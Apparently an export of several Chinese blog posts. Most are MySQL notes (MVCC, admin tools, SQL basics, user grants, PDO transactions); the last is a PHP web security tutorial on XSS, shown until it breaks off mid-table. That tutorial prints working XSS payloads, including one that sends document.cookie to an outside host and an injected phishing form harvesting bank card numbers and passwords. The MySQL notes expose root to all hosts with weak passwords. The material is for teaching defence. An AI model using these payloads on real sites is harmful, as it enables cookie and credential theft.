  ![image-20220725175956274](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ba909042ed2f328de0ca377b79e28fca-ebc8b9d.png)

  在RR隔离级别下，只是在事务中第一次快照读时生成ReadView，后续都是复用该ReadView，那么既然ReadView都一样， ReadView的版本链匹配规则也一样， 那么最终快照读返回的结果也是一样的。

> MVCC的实现原理就是通过 InnoDB表的隐藏字段、UndoLog 版本链、ReadView来实现的。
> MVCC + 锁，则实现了事务的隔离性。 而一致性则是由redolog 与 undolog保证。

## MySQL管理

### 系统数据库

Mysql数据库安装完成后，自带了一下四个数据库，具体作用如下：

| 数据库 | 含义 |
| ------ | ---- |
|mysql |存储MySQL服务器正常运行所需要的各种信息 （时区、主从、用户、权限等）|
|information_schema|提供了访问数据库元数据的各种表和视图，包含数据库、表、字段类型及访问权限等|
|performance_schema|为MySQL服务器运行时状态提供了一个底层监控功能，主要用于收集数据库服务器性能参数|
|sys|包含了一系列方便 DBA 和开发人员利用 performance_schema性能数据库进行性能调优和诊断的视图|

### 常用工具

#### mysql客户端工具

```
语法 ：
	mysql [options] [database]
选项 ：
 -u, --user=name #指定用户名
 -p, --password[=name] #指定密码
 -h, --host=name #指定服务器IP或域名
 -P, --port=port #指定连接端口
 -e, --execute=name #执行SQL语句并退出
```

`-e`选项可以在Mysql客户端执行SQL语句，而不用连接到MySQL数据库再执行，对于一些批处理脚本，这种方式尤其方便。

```shell
$ mysql -uroot –p123456 ni9nes_DB -e "select * from stu"; 
```

#### mysqladmin

mysqladmin 是一个执行管理操作的客户端程序。可以用它来检查服务器的配置和当前状态、创建并删除数据库等。

```
通过帮助文档查看选项：
	mysqladmin --help
	
语法:
	mysqladmin [options] command ...
选项:
 -u, --user=name #指定用户名
 -p, --password[=name] #指定密码
 -h, --host=name #指定服务器IP或域名
 -P, --port=port #指定连接端口
```

```shell
$ mysqladmin -uroot –p123456 drop 'test01';
$ mysqladmin -uroot –p123456 version;
```

#### mysqlbinlog

由于服务器生成的二进制日志文件以二进制格式保存，所以如果想要检查这些文本的文本格式，就会使用到**mysqlbinlog** 日志管理工具。

```
语法 ：
	mysqlbinlog [options] log-files1 log-files2 ...
选项 ：
 -d, --database=name 指定数据库名称，只列出指定的数据库相关操作。
 -o, --offset=# 忽略掉日志中的前n行命令。
 -r,--result-file=name 将输出的文本格式日志输出到指定文件。
 -s, --short-form 显示简单格式， 省略掉一些信息。
 --start-datatime=date1 --stop-datetime=date2 指定日期间隔内的所有日志。
 --start-position=pos1 --stop-position=pos2 指定位置间隔内的所有日志。
```

```shell
$ sudo mysqlbinlog -s -d ni9nes_DB /var/lib/mysql/binlog.000002
```



#### mysqlshow

mysqlshow 客户端对象查找工具，用来很快地查找存在哪些数据库、数据库中的表、表中的列或者索引。

```
语法 ：
	mysqlshow [options] [db_name [table_name [col_name]]]
选项 ：
 --count 显示数据库及表的统计信息（数据库，表 均可以不指定）
 -i 显示指定数据库或者指定表的状态信息
```

```shell
#查询test库中每个表中的字段书，及行数
$ mysqlshow -uroot -p2143 test --count
#查询test库中book表的详细情况
$ mysqlshow -uroot -p2143 test book --count
```

#### mysqldump

mysqldump 客户端工具用来备份数据库或在不同数据库之间进行数据迁移。备份内容包含创建表，及插入表的SQL语句。

```
语法 ：
	mysqldump [options] db_name [tables]
	mysqldump [options] --database/-B db1 [db2 db3...]
	mysqldump [options] --all-databases/-A
连接选项 ：
 -u, --user=name 指定用户名
 -p, --password[=name] 指定密码
 -h, --host=name 指定服务器ip或域名
 -P, --port=# 指定连接端口
输出选项：
 --add-drop-database 在每个数据库创建语句前加上 drop database 语句
 --add-drop-table 在每个表创建语句前加上 drop table 语句 , 默认开启 ; 不开启 (--skip-add-drop-table)
 -n, --no-create-db 不包含数据库的创建语句
 -t, --no-create-info 不包含数据表的创建语句
 -d --no-data 不包含数据
 -T, --tab=name 自动生成两个文件：一个.sql文件，创建表结构的语句；一个.txt文件，数据文件(并不是记录一条条的insert语句，而是按照一定的格式记录表结构中的数据)
```

```shell
$ mysqldump -uroot -p1234 db01 > db01.sql
```

#### mysqlimport/source

- mysqlimport

  mysqlimport 是客户端数据导入工具，用来导入mysqldump 加 -T 参数后导出的文本文件。

  ```
  语法 ：
  	mysqlimport [options] db_name textfile1 [textfile2...]
  ```

  ```shell
  $ mysqlimport -uroot -p2143 test /tmp/city.txt
  ```

  

- source

  如果需要导入sql文件,可以使用mysql中的source 指令 :

  ```
  source /root/xxxxx.sql
  ```

## 视图/存储过程/触发器/函数


]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Navicat通过ssh-秘钥方式登录</title>
    <url>/2021/01/15/MySql/MySQL%20navicat%E9%80%9A%E8%BF%87ssh-%E7%A7%98%E9%92%A5%E6%96%B9%E5%BC%8F%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[
### 1.准备私钥文件:

 `id_rsa_2048.pub`

![1596767009388](/images/imgs/Navicat使用/1596767009388.png)

### 2.转换.pub文件为PEM文件

#### 2.1.使用`xshell`, 打开`工具`-`用户秘钥管理者`

![1596767129649](/images/imgs/Navicat使用/1596767129649.png)

#### 2.2.点击选中秘钥, 点击导出

> 如果没有秘钥, 请手动生成并将其发给管理员, 供其写入服务器验证文件

![1596767239840](/images/imgs/Navicat使用/1596767239840.png)

#### 2.3.选择保存目录及文件名, 默认为PEM格式, 不用修改

![1596767321155](/images/imgs/Navicat使用/1596767321155.png)

#### 2.4.输入密码, 导出完成(无提示)

![1596767348706](/images/imgs/Navicat使用/1596767348706.png)

### 3.使用`Navica`t链接数据库

#### 3.1.打开Navicat, 选择新建链接

> 不要在原有数据库链接上修改, 否则有可能报错: `connectiong has been used`

![1596767449908](/images/imgs/Navicat使用/1596767449908.png)

#### 3.2.填写常规项

![1596767605626](/images/imgs/Navicat使用/1596767605626.png)

#### 3.3.填写SSH项

勾选使用SSH通道, 填写内容, 选择验证方法为公钥

![1596767822670](/images/imgs/Navicat使用/1596767822670.png)

3.4.选择生成的PEM公钥文件

![1596767945543](/images/imgs/Navicat使用/1596767945543.png)

#### 3.5.输入生成公钥时的密码,测试连接

![1596768055237](/images/imgs/Navicat使用/1596768055237.png)]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 基础操作-增删改查</title>
    <url>/2018/04/05/MySql/MySQL%20%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[
## 1.数据库

### 1.数据库基本操作

常见数据库包括：**MySQL**，Oracle，SQL server，Redis ...

1.定义

​	存储数据的仓库，即按照数据结构来组织，存储和管理数据的仓库

> 选择 MySQL 的原因有：免费，开源，跨平台，支持事务...

2.链接数据库的步骤

​	开启服务器——>设置主机IP——>用户名（默认root）——>密码（默认为空）

3.组成

​	一个完整的数据库由库（database），表（table）和数据（data）组成，先有库，再有表，最后才有数据的增删改查，也就是说先使用库，才能使用表

4.基本语法

​	MySQL 的每一条数据都是以分号( ; ) 作为结束符

5.常用SQL命令

​	打开命令窗口：	F6

​	使用数据库：	`use 库名;` 

​	创建数据库：	`create database [if not exists] 库名 default charset 编码方式;`  

​	删除数据库：	`drop database 库名;` 

​	查询数据库结构：	`show databases;`	注意：database需要加s，作为复数格式

​	查询数据表：	`show tables;` 	注意：在使用库之前，无法使用表

​	创建数据表：	

```
		create table if not exists 库名(
		
		字段名		字段类型		字段属性,
		字段名		字段类型		字段属性,
		字段名		字段类型		字段属性,
			...
		字段名		字段类型		字段属性,
		字段名		字段类型		字段属性
        
		)engine=myisam|innodb default charset=utf8;
```

​			**注意：每一组之间用逗号( , ) 隔开，最后一组字段不用加**

​	删除数据表：	`drop table 表名；` 

​	查看表结构：	`desc 表名；` 

​	查看建表语句：	`show create table 表名` 

​	注意：所有的库名，表名，字段名都需要加上反引号( ` )，所有的字符串需要加上单双引号

​		   反引号可以将库名，表名，字段名实体化，取消特殊意义





### 2.数据库数据操作

#### 1.插入数据（增）

1. ##### 插入单条数据：

   格式：

    `insert into 表名 values(值1，值2，值3，...);` 	

   注意点：

   ​	主键由于配合自增属性，所以不用主动设置，默认用`null`代替，值会自动根据最大记录+1；

   ​	如果有默认值，可以用`default`代替

2. ##### 插入单条数据部分字段：

   格式：

    `insert into 表名（字段1，字段2，字段3，....） vaules(值1，值2，值3，...);` 

   注意：

   ​	表名后面填了多少个字段，values就对应填多少个值；

   ​	如果字段具有not null属性，那么必须填写‘’

   使用场合：用户注册，不需要填写所有数据表单

3. ##### 插入多条数据：

   格式：

    `insert into 表名 values(...),(...),(...), ... (...);` 

4. ##### 插入多条数据部分字段

   格式：

    `insert into 表名（字段1，字段2，...）values(...),(...),(...), ... (...);`

#### 2.更新数据（改）

1. ##### 更新所有数据

   格式：

    `update 表名 set 字段1=值1，字段2=值2，...;` 

2. ##### 条件更新

   格式：

    `update 表名 set 字段1=值1，字段2=值2，... where 条件表达式` 

#### 3.删除数据（删）

1. ##### 全部删除

   格式：

   ​	 `delete from 表名；`

   注意：该删除方式只会删除数据，不会删除曾经的数据记录

2. ##### 全部删除（不留记录）

   格式：

   ​	 `truncate table 表名；` 

   注意：该删除方式会连着数据和记录一起删除，如果想清空表，推荐使用truncate

3. ##### 部分删除

   格式：

   ​	 `delete from 表名 where 条件表达式；` 

4. ##### 排序删除

   格式：

   ​	 `delete from 表名 [where 条件表达式] order by 字段 asc|desc limit 行数` 

   注意： `asc`为升序排序，`desc`为降序排序

### 3.函数

#### 1.聚合函数

- 统计总个数：count( )

  `select count(id) from user;`		统计user表中一共有几个id

- 求和：sum( )

  `select sum(age) from user;` 		统计user表中age的综合

- 求平均值：avg( )

  `select avg(age) from user;` 		统计user表中的平均年龄

- 求最大值：max( )

  `select max(age) from user;` 		获取user表中的最大年龄

- 求最小值：min( )

  `select min(age) from user;` 		获取user表中的最小年龄 

#### 2.字符串拼接函数

​	格式：`concat(s1,s2,s3,...)`

​	注意：s1,s2,s3可以代表字段名，也可以代表字符串值

​	`select concat(id,'......',nickname,'......',address) from user;` 

#### 3.数据库版本

​	`select version();`

#### 4.当前时间

​	`select now();`  

#### 5.md5加密

​	`md5('1234234');` 

#### 6.当前时间戳

​	`select unix_timestamp();` 

### 4.查询数据

#### 1.整体结构

```
	select  * | distinct | 字段名 | 字段名 as 别名 | 表名.字段名
	from    表名 | 表名1，表名2，...
	where   条件表达式
	group by 字段
	having 条件
	order by 条件
	limit 下标，行数
```

> 注意：以上为查询数据的基本结构，先后书序无法颠倒，但可以省略其中一部分

#### 2.具体查询

- 查询1：查询该表中的所有数据

  格式： `select * from 表名；` 		

  实例： `select * from user;` 

  **注意**： `*` 通配符代表所有的字段，查询所有的字段，推荐少用或不用

- 查询2：查询该表中的指定字段

  格式： `select 字段1，字段2，字段3，... from 表名；` 

  实例：`select tel pwd from user;` 

- 查询3：带条件查询

  格式：`select *|字段名 from 表名 where 条件；` 

  - `<` 查询所有未成年的名字

    `select name from user where age<18;` 

  - `>=`  查询所有成年的名字

    `select name from user where age>=18;` 

  - `=`  精确查询刚好18岁的名单

    `select name from user where age=18;`  

  - `!=`  查询所有不是18岁的名单

    `select name from user where age!=18;` 

  - `between A and B`  查询年龄在15到30之间的名单

    `select name from user where age between 15 and 30;` 

  - `not between A and B`  查询年龄不在20~30岁之间的名单

    `select name from user where age not between 20 and 30;` 

  - `like` 模糊查询 名字带有’小‘的名单

    `select name like "小"；` 

    `select name like "%小%";` 

    **注意**：`%` 通配符可匹配0个，1个或多个字符；

    ​	    `_` 通配符可以匹配一个字符

  - `in` 查询来自于召唤师峡谷的名单

    `select name,address from user where address in ('召唤师峡谷');` 

  - `not in` 查询地址信息不为空的名单

    `select name,address from user where address not in ('null');` 

  ------

  - 逻辑：与 `and`  |  或 `or` 

    - 查询 来自于召唤师峡谷的女孩子

      `select name,address,sex from user where address='召唤师峡谷' and sex=2;`  

    - 查询女孩子或者来自于xxx楼的名单

      `select name,address,sex from user where address like "%楼" or sex=2;`  

  - 空与非空： `is null ` 和 `is not null` 

    - 查询有住址的名单

      `select name from user where address is not null;` 

    - 查询住址信息为空的名单

      `select name from user where address id null;` 

  - `group by` 分组 :

    查询user中名单分别来自哪些地方

     `select address from user group by address;` 

    **注意**：一旦分组，就不能查询单一数据，必须按照“组”为单位来查询

  - `having` 筛选：

    筛选人数多于一个的地址

    `select address,count(id) from user group by address having count(id)>1;` 

    **注意**：`having`一般都是配合`group by`来使用，先分组再筛选

  - `order by` 排序

    按照生日从大到小查看名单

    `select nickname,birthday from user order by birthday desc;` 

    **注意**：`desc`为降序排序，`asc`为升序排序

  - `limit` 前几个

    查询user表单中的前3个人信息

     `select * from user limit 3;` 

    **注意**：标准格式为：`limit 下标，行数`,代表从下标开始的几行数据

### 5.多表查询

> 多张表同时查询

#### 1.条件限制：

​	多张表之间必须要求有联系

​	多表有相同字段时，必须声明是哪张表中的字段（表名.字段名）

​	n张表之间的联系至少有 n-1 条

#### 2.格式：

```
	select 字段
	from 表名1，表名2，表名3，...
	where 表名1.字段1 = 表名2.字段1 ...
	...
```

#### 3.实例：

​	查询每个人的昵称，住址，部门，薪资

```
	select uid,nickname,address,dep,money
	from user,salary
	where user.id=salary.uid
```

### 6.嵌套查询

> 将一条sql语句的结果作为另一条sql的条件来使用

实例

​	查询每个部门最高工资的uid

```
	select uid,money,dep
	from salary
	where money in ( select max(money) from salary group by dep )

```

### 7.多表+嵌套

​	查询每个部门最高工资的uid

```
	select uid,s.money,s.dep
	from salary as s,(
		select dep,max(money) as money 
		from salary 
		group by dep ) as t
	where s.dep=t.dep and s.money=t.money

```

### 8.别名

​	给字段，表名取个别名 `as` 

​	`select dep,max(monry) as money from salary as s group bu dep;` 

### 9.取消重复

​	`select distinct address from user;`

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL- 用户账号相关操作</title>
    <url>/2020/09/05/MySql/MySQL%20%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[
## MySQL 用户账号相关操作

### 具体操作命令格式

> 以下为常用命令

```
-- 查询用户
SELECT * FROM user;
-- 创建用户, 仅可看information_schema库
CREATE USER 'naxx'@'%' IDENTIFIED BY '111111';
-- 添加该用户对某个库的查询,更新权限
GRANT SELECT,UPDATE ON qjjfwpt_saas.* TO 'naxx'@'%';
-- 添加该用户对某个库的删除,更新权限
GRANT DELETE ON qjjfwpt_saas.* TO 'naxx'@'%';
-- 添加该用户对某个库的视图查询权限
GRANT SHOW VIEW ON qjjfwpt_saas.* TO 'naxx'@'%';
-- 刷新权限
FLUSH privileges;
-- 显示该用户在所有IP下的权限
SHOW GRANTS FOR 'naxx'@'%';
-- 显示该用户在指定IP下的所有权限
SHOW GRANTS FOR 'naxx'@'127.0.0.1';
-- 删除查看视图权限
REVOKE SHOW VIEW ON qjjfwpt_saas.* FROM 'naxx'@'%';
-- 删除指定用户
DROP USER 'naxx'@'%';
-- 修改用户密码
SET PASSWORD FOR 'naxx'@'%'=PASSWORD('123456789');
-- 密码过期(下次登录需要自行修改密码)
ALTER USER 'naxx'@'%' PASSWORD EXPIRE;
-- 锁定用户
ALTER USER 'naxx'@'%' account lock;
-- 解锁用户
ALTER USER 'naxx'@'%' account unlock;
```

### 权限设定关键字

![I3wLQVQjl9](/images/imgs/I3wLQVQjl9.png)

### 初始密码问题

```shell
刚安装好的mysql登录使用auth_socket
获取root权限
	$ su root
登录mysql
	$ mysql
执行SQL
	mysql> update mysql.user set host='%',plugin='mysql_native_password',authentication_string=password('123456789') where user='root';
	mysql> flush privileges;
	mysql> exit;
修改mysql配置
	$ sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf
注释以下行
	# bind-address          = 127.0.0.1
重启mysql服务
	$ sudo service mysql restart
即可正常使用Navicat客户端连接数据库
```



]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端 - MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL- 事务操作</title>
    <url>/2018/05/15/MySql/MySQL-%20%E4%BA%8B%E5%8A%A1%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[### 事务操作

```

	
	// 事务: 将 多条sql语句绑定为一个整体, 其中有任意一条sql 失败, 则整体失败.
	// 	
	// 	MyISAM 不支持事务 

	// 	InnoDB 支持事务


	// 自动提交:
	// 	默认情况下, sql一旦执行, 就会立马改变sql的状态
	// 	关闭自动提交, sql一旦执行, 能得到sql的状态结果, 但是sql不会真正的改变

	
	try {
		$pdo = new PDO('mysql:host=localhost;dbname=s86;charset=utf8','root','pass');
	} catch (Exception $e) {
		echo '数据库链接失败'; die;
	}


	// 事务操作步骤

	try {
		// 1. 关闭自动提交
			$pdo->setAttribute(PDO::ATTR_AUTOCOMMIT, 0);

		// 2. 开启一个事务 (游戏中的存档)
			$pdo->beginTransaction();

		// 3. 执行sql
			# 1) 扣钱  -10W 
			$sql = "UPDATE `salary` SET  `money`=`money`-100000 WHERE `uid` = 5 ";
			$rows = $pdo->exec($sql);
			if($rows < 1){
				throw new Exception('工资转出失败');
			}

			# 2) 加钱  +10W
			$sql = "UPDATE `salary` SET  `money`=`money`+100000 WHERE `uid` = 4 ";
			$rows = $pdo->exec($sql);
			if($rows < 1){
				throw new Exception('工资转入失败');
			}


		// 4. 执行成功, 提交事务, 真正的改变sql状态
			$pdo->commit();

	} catch (Exception $e) {
		// 4. 执行失败,  回滚事务, 回到开始事务时的sql状态
		echo $e->getMessage();
		$pdo->rollBack();  # 读档
	}
	

	// 5. 开启自动提交
	$pdo->setAttribute(PDO::ATTR_AUTOCOMMIT, 1);




```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端 - MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP编码安全及常见攻击</title>
    <url>/2022/08/22/%E5%AE%89%E5%85%A8/PHP%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[
# PHP编程安全

## Cookie简介

HTTP是一种**无状态协议**, 即不对请求和响应之间的通信状态进行保存. 也就是说, 无法根据之前的状态关联本次的请求处理. 目的是更快的处理大量事务, 确保协议的可伸缩性

为了解决这个问题, 引入**Cookie**. 客户端第一次访问服务时, 服务器生成Cookie, 通过响应发送给客户端, 并记录该Cookie对应的客户会话信息. 之后当客户端携带Cookie访问服务器时, 服务器就可以辨识本次请求的来源用户身份

![image-20220908094428755](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b1eb843bebdf74317d35b9d48641ce1-fc2d819.png)

## Web安全总览

Web攻击可分为**主动攻击**(Active Attack) 和 **被动攻击**(Passive Attack)

### 主动攻击

攻击者直接攻击Web服务器, 如SQL注入等

![image-20220908095458915](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a4f1d6afddf1b00bbeb932b988eb3ec-73541a8.png)

### 被动攻击

攻击者不直接攻击服务器, 而是针对网站用户设下陷阱, 利用掉入陷阱的用户来获取修改用户数据或攻击应用程序

- **模式一 单纯被动攻击**

  ![image-20220908095818486](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/231f512a97705bc18fdefad67c6a1cf3-40aae6f.png)

  用户在浏览过所谓的“可疑网站"之后会感染上恶意软件。理论上如果浏览器（包括Adobe Flash Player等插件）不存漏洞，此类单纯的被动攻击是行不通的。但现实中，浏览器以及Adobe Reader、Adobe Flash Player、JRE 等插件的漏洞却层出不穷

- **模式二 在正规网站中设置陷阱的被动攻击**

  ![image-20220908100156321](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b18347cab7175548a852fea3020196b8-fe0b8a0.png)

  攻击者示先入侵正规网站，往箕内容中嵌入恶意代码（①）。网站用户在浏览了含有恶意代码的内容后（②、③），就会感染病毒（④）。在这一流程中，单看步骤①的话似乎应归类为主动攻击，但步骤②、③均为被动攻击，因此可将①视作被动攻击的前期准备。

  | 设置陷阱 | 手法                                                         |
  | :------: | ------------------------------------------------------------ |
  |    1     | 非法获取FTP等服务器密码后篡改网站内容                        |
  |    2     | 通过攻击Web服务器的安全漏洞篡改网站内容                      |
  |    3     | 通过SQL注入篡改网站内容                                      |
  |    4     | 在社交网络这类用户可以自己发布内容的网站, 利用跨站脚本漏洞实施攻击 |

- **模式三 跨站被动攻击**

  ![image-20220908100654086](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0c94125098751edd51f007d625fd14d7-7505744.png)

  此类攻击的特征为，恶意利用已经在正规网站登录的用户账号来实施攻击。由于步骤③的请求中要向正规网站发送会话Cookie，因此，如果用户己经在正规网站登录，就会利用其己经登经的状态实施攻击。

  此类攻击模式的典型案例包括，在步骤③的请求中对Web应用发动攻击的**跨站请求伪造(CSRF)**，以及在步骤④的响应中利用浏览器来执行攻击的**跨站脚本攻击(XSS)**和**HTTP消息头注入攻击**。

### 浏览器防御被动攻击

针对被动攻击，浏览器和网站都需要采取相应的防御措施。如果浏览器存在安全问题，网站方面即使实施了对策也无法完全确保安全性。

#### 浏览器安全功能一

浏览器能在用户浏览网站的同时运行一些程序，比如JavaScript、 Java Applet、Adobe Flash Player、 ActiveX等。而为了防止恶意程序在用户的浏览器上运行，JavaScript等语言提供了一些增强安全性的功能。基本思想有如下两种:

- **CA签名确认** 只有在用户确认了程序的发行方并允许运行的情况下，程序才能被运行
- **Sandbox** 提供限制程序权限的沙盒环境(禁止访问本地文件/禁止使用打印机/限制网络访问)

#### 浏览器安全功能二

**同源策略** - 协议、域名(指向主机)、端口，这三个完全相同的 URL 才能称之为同源

如果同源, 在iframe外部就可以通过JS取得内部的HTML内容

- **同源**

  ![image-20220908105931524](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e5c7018912f2d264a4e741517f62fb6f-bc89a16.png)

- **非同源**

  ![image-20220908110234735](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ae444459dddc7737b6fd57372544a3bd-cfebaf8.png)

### 应用程序安全隐患

虽然浏览器的同源策略为抵御被动攻击设下了一道屏障，但如果应用程序中存在安全隐患，还是有可能遭受到被动攻击。跨站脚本攻击(XSS)就是典型的例子。

![image-20220908112611999](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bcfdfc16356c795428f24d58587fff1b-e9abeb0.png)

### Web应用功能与安全隐患关系

![image-20220908112751743](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/06491573400c70b760d123855f2b0951-4019c91.png)

Web应用可以使用 **输入-处理-输出** 模型表示, 从HTTP请求输入开始, 经过服务器应用的各种处理, 最后由HTTP响应进行输出. 而除了HTTP响应, 此处的输出还包括访问数据库、读写文件、收发邮件等与其他服务交流的操作

| 输出             | 安全隐患       | 恶意手段              | 数据边界符 |
| ---------------- | -------------- | --------------------- | ---------- |
| 输出HTML         | 跨站脚本       | 注入JavaScript等      | `<` |  `"` |
| 输出HTTP消息头   | HTTP消息头注入 | 注入响应消息头        | 换行符     |
| 执行SQL语句      | SQL注入        | 注入SQL命令           | `'` | `--` |
| 调用Shell命令    | OS命令注入     | 注入系统命令          | `;` | `\|` |
| 输出邮件头和正文 | 邮件头注入     | 注入/修改邮件头或正文 | 换行符     |

## 页面显示相关问题

### 跨站脚本XSS

通常情况下, 在Web应用的网页中, 有些部分的**显示内容会依据外界输入值而发生变化**(会反弹恶意代码), 而如果生成这些HTML的程序中存在问题，就会滋生**跨站脚本(Cross-Site Scripting)**安全隐患. 由于和知名的CSS(层叠样式表)缩写冲突, 所以经常缩写为**XSS** 

Web应用若存XSS漏洞, 会有下列风险:

- 用户的浏览器中运行攻击者的恶意脚本，从而导致Cookie信息被窃取，用户身份被冒名顶替
- 攻击者能获得用户的权限来恶意使用Web应用的功能
- 向用户显示伪造的输入表单，通过钓鱼式攻击(Phishing)窃取用户的个人信息

| 对象         | 结果                                                       |
| ------------ | ---------------------------------------------------------- |
| 产生地点     | Web应用中生成HTML和JavaScript的位置                        |
| 影响范围     | Web应用全体                                                |
| 影响类型     | 在网站用户的浏览器中执行JavaScript, 显示伪造的网站内容     |
| 影响程度     | 中 ~ 大                                                    |
| 用户参与程度 | 需要: 浏览恶意网站、点击邮件附属链接、浏览已经被入侵的网站 |
| 对策概要     | 双引号括起属性值, 转义HTML中的特殊字符                     |

#### 窃取Cookie

- 1.目标页面: 对用户输入没有做任何处理, 复现在页面上

  ![image-20220908124242361](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/73852fd699e8745eab4e9ed6e7052b5e-a581dcd.png)

- 2.输入简单的JavaScript注入

    ```js
    <script> alert(document.cookie) </script>
    ```

    ![image-20220908124549687](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b88a194f1c00e444a2e181857f6b295c-ad70927.png)

- 3.构建钓鱼页面, 诱使用户点击

  ![image-20220908140815830](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f2408d519e6b0598afbbed974528cff9-bc0d1aa.png)

  ```html
  <iframe width="300" height="200" src="http://localhost/test/WebSecure/cookie/search.php?item=<script>window.location='http://ni9ne.com.cn/collectCookie.php?sid='%2Bdocument.cookie;</script>"></iframe>
  ```

- 4.查看结果

  ![image-20220908141430251](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9fe06249a4c3f49f740f5241159a76ce-bebfdd9.png)

#### 篡改网页

- 1.目标页面

  ![image-20220908171049197](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dda1006bebd359ef7d60210ffea107f3-2180dc8.png)

  ![image-20220908171109548](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b8b7380fecd34839627c7e99d8fdad2-e6811c0.png)

- 2.构建钓鱼页面, 诱使用户点击

  ![image-20220908171448002](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f4abb263cbb83f3d632dd8ea05b1e7cd-ad0da87.png)

  ```html
  <input type="hidden" name="name" value='
  	"></form>
  	<form style="top:5px;left:5px;position:absolute;z-index: 99;background-color: white;" action="http://ni9ne.com.cn/phishing_order_res.php" method="POST">
   	<h1>预约报名</h1>
   	姓名 <input type="text" name="name" size="20" value="ni9ne"><br>
   	地址 <input type="text" name="addr" size="20" value="佳园路111号"><br>
   	电话 <input type="text" name="tel" size="20" value="15988954253"><br>
   	银行卡号 <input type="text" name="card" size="20" value="xxxxxx"><br>
   	登陆密码 <input type="text" name="pwd" size="20" value="xxxxxx"><br>
   	<input type="submit" value="预约">
   	<br><br><br><br>
   	</form>
  '>
  ```

  

- 3.用户点击, 查看结果

  ![image-20220908171859666](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dca607ff717a43a2a94bb15aa3b9ab28-0d72f5c.png)

  ![image-20220908172054985](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/33800ebd86c306a90c6a2ae2f68f2403-a1265f1.png)

**攻击原理**:

恶意网页通过下列手段隐藏原来的form并添加新的form, 从而改变页面

1.使用 `"></form>` 闭合原有form元素

2.添加新的form元素, 并通过指定样式方式赢藏原有form

- 通过固定绝对坐标方式将form固定

- 将`z-index` 设置为最大值, 确保悬浮在原有form上方

- 将背景指定为网站整体背景色, 隐藏原有form

3.在新的form中指定提交目标为恶意网站

#### href/src属性XSS

有些元素的属性值为URL, 如 `a` 元素的 `href` 属性, `img` 、`frame` 、`iframe` 元素的 `src` 属性. 如果属性值中的URL是由外界传入, 就可能通过使用 `javascript: js代码` 形式的URL执行JavaScript代码. 

- 1.目标页面

  ![image-20220908181539429](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/daeccb79ee0b5bde3f46f97222071318-16f97e5.png)

  ![image-20220908181738586](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d79d85c52814b41c936fd3166afc7088-b7b0265.png)

- 输入js代码

  ```js
  javascript:alert(document.cookie)
  ```

  ![image-20220908182004565](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8c94882ee92d3c129313650a4024415d-87a7746.png)

**对策**:

URL由程序动态生成时, 需要对其进行校验, 仅允许 http 和 https协议. 此外, 通过校验的URL还需要作为属性值进行HTML转义. 即URL属性必须满足两个条件中的一个:

- 以 `http:` 或 `https:` 开头的绝对URL
- 以 `/` 开头的相对URL

#### JavaScript的动态生成

Web应用中, 服务器依据客户输入动态生成一部分JavaScript. 可能存在js注入风险

- 1.目标页面

  ![image-20220908183951550](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/318dd6c2c614ccacda91cd24903c5879-7fbb498.png)

  ![image-20220908184057779](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bae27fc34c07da5071be9c8a26b1e2da-ef7ff12.png)

- 输入JS代码

  ```
  ');alert(document.cookie)//
  ```

  ![image-20220908184224255](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/960c3dd4af25438caec235bdac842896-deb7ac0.png)

  实际页面变为:

  ![image-20220908184424050](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a795e0d4a8d02b584b41049bf33d930e-d99973b.png)

**对策**:

需要对JavaScript字符串进行转义, 避免单引号 `'` 被作为结束边界符

- 将数据作为js字符串进行转义
- 将得到的结果再次进行html实体化

| 原字符                  | JavaScript转义后           | HTML实体化后                              |
